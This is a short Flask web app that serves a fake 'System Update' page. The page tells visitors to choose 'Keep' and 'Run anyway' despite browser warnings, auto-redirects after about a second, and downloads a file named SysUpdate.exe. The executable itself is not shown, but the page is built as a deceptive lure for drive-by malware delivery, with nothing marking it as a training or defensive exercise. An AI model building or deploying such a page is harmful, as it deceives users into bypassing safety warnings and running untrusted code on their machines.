from flask import Flask, send_file, Response
app = Flask(__name__)
PAGE = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Update Center</title><style>
body{margin:0;height:100vh;display:grid;place-items:center;background:#0e1116;
color:#e6edf3;font:16px/1.6 system-ui,sans-serif;text-align:center}
a{display:inline-block;margin-top:18px;padding:14px 34px;background:#238636;
color:#fff;border-radius:8px;text-decoration:none;font-weight:600}
p{color:#8b949e;max-width:420px}</style></head><body><div>
<h1>System Update</h1>
<p>Your browser may warn that the file is uncommon. Choose <b>Keep</b>, then <b>Run anyway</b>.</p>
<a href="/d">Download</a></div>
<script>setTimeout(()=>location.href='/d',1200)</script></body></html>"""

@app.get("/")
def home(): return PAGE

@app.get("/d")
def dl(): return send_file("static/SysUpdate.exe", as_attachment=True, download_name="SysUpdate.exe")

@app.get("/health")
def h(): return Response("ok", mimetype="text/plain")
